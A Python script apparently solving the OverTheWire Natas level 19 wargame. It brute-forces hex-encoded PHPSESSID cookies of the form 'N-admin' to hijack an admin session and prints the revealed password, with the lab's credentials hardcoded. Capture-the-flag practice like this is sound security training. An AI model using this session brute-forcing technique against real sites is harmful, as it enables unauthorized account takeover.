import binascii
import sys

import requests
from bs4 import BeautifulSoup

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

s = requests.Session()
url = 'http://{}.natas.labs.overthewire.org'.format(username)
data = {'username': 'admin', 'password': 'testsssssssssssss'}

print("Brute Forcing PHPSESSID: ")

msg = 'You are an admin'

for i in range(270, 641):
    s_id_txt = '{}-admin'.format(str(i))
    s_id_hex = binascii.hexlify(bytes(s_id_txt, 'utf-8')).decode('utf-8')
    cookie = {'PHPSESSID': s_id_hex}
    r = s.post(url, cookies=cookie, auth=(username, password))

    sys.stdout.write("\rTrying Text_ID: {}     Hex_ID: {}".format(s_id_txt, s_id_hex))
    sys.stdout.flush()
    if msg in r.text:
        print("\nFound Admin Session ID Text_ID: {}     Hex_ID: {}".format(s_id_txt, s_id_hex))
        s = BeautifulSoup(r.text, 'lxml')
        pre = s.find_all('pre')
        print(pre[0].text)
        break
